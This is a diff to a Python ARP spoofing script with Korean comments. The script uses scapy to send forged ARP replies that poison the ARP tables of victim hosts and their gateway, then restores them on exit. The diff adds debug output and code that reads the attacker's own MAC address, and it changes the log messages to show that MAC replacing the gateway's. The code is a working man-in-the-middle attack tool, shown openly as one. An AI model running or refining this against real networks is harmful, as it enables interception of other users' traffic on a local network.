@@ -11,6 +11,7 @@ from scapy.layers.l2 import Ether, ARP #Classes and functions for layer 2 protoc
 from time import sleep
 import sys
 import nmap
+import uuid
 
 # ARP Packet Operation Code
 ARP_REQUEST = 1
@@ -21,8 +22,7 @@ BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'
 
 def getMAC(target_ip:str) -> str | None:
     '''IP 주소를 입력받아 MAC 주소를 리턴한다.'''
-    if DEBUG:
-        print(f"getMAC({target_ip})")
+    if DEBUG: print(f"getMAC({target_ip})")
     # target_ip의 MAC 주소를 알아내기 위해 ARP 패킷을 broadcast로 전송
     # 타임아웃 5초, 재시도 3번
     # 리턴값 : (송신패킷, 수신패킷)리스트, 송신패킷 리스트
@@ -31,14 +31,14 @@ def getMAC(target_ip:str) -> str | None:
     # 수신된 패킷에서 MAC 주소를 리턴
     for sent_packet, received_packet in sndrcvlist:
         # 찾았으면 MAC 주소 리턴, 못찾았으면 None 리턴
-        if DEBUG:
-            print(f"return {received_packet.sprintf('%Ether.src%')}")
+        if DEBUG: print(f"return {received_packet.sprintf('%Ether.src%')}")
         return received_packet.sprintf('%Ether.src%')
     
     
 def poisonARP(sender_ip:str, target_ip:str, target_mac:str) -> None:
     '''ARP Spoofing을 위한 ARP 패킷을 전송한다.'''
     
+    if DEBUG: print(f"poisonARP({sender_ip}, {target_ip}, {target_mac})")
     # Spoofing ARP 패킷을 생성
     arp=ARP(op=ARP_REPLY, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)
     # ARP 패킷을 전송
@@ -48,6 +48,7 @@ def poisonARP(sender_ip:str, target_ip:str, target_mac:str) -> None:
 def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -> None:
     '''ARP Spoofing을 해제하기 위해 ARP 패킷을 전송한다.'''
     
+    if DEBUG: print(f"restoreARP({target_ip}, {target_mac}, {gateway_ip}, {gateway_mac})")
     # 희생자 컴퓨터의 ARP테이블을 복구하는 ARP 패킷 (게이트웨이에서 보낸 것 처럼 위조)
     target_restore_arp=ARP(op=ARP_REPLY, psrc=gateway_ip, pdst=target_ip,  hwdst=BROADCAST_MAC, hwsrc=gateway_mac)
     # 게이트웨이의 ARP테이블을 복구하는 ARP 패킷 (희생자에서 보낸 것 처럼 위조)
@@ -78,8 +79,7 @@ def main(*args, **kwargs) -> int:
         
         target_ips = [] # 희생자 IP 리스트
         for ip in argv[2:]:
-            if DEBUG:
-                print(f"target_ip: {ip}")
+            if DEBUG: print(f"target_ip: {ip}")
             target_ips.append(ip)
         
     elif argc == 3 and (argv[1] == "--multiple" or argv[1] == "-m"):
@@ -116,10 +116,11 @@ def main(*args, **kwargs) -> int:
             print('Target MAC 주소를 찾을 수 없습니다')
             return -1
 
+    own_mac = ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][i:i+2] for i in range(0, 12, 2)]) # 자신의 MAC 주소\
     # ARP Spoofing 시작
     for target_ip, target_mac in zip(target_ips, target_macs):
         print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
-        print(f"[{target_ip}]: POISON ARP Table [{gateway_mac}] -> [{target_mac}]")
+        print(f"[{target_ip}]: POISON ARP Table [{gateway_mac}] -> [{own_mac}]")
         poisonARP(gateway_ip, target_ip, target_mac)
         poisonARP(target_ip, gateway_ip, gateway_mac)
         
@@ -132,7 +133,7 @@ def main(*args, **kwargs) -> int:
     except KeyboardInterrupt:
         for target_ip, target_mac in zip(target_ips, target_macs):
             restoreARP(target_ip, target_mac, gateway_ip, gateway_mac)
-            print(f"[{target_ip}]: RESTORE ARP Table [{target_mac}] -> [{gateway_mac}]")
+            print(f"[{target_ip}]: RESTORE ARP Table [{own_mac}] -> [{gateway_mac}]")
             
     print("ARP Spoofing 종료 완료")
     return 0
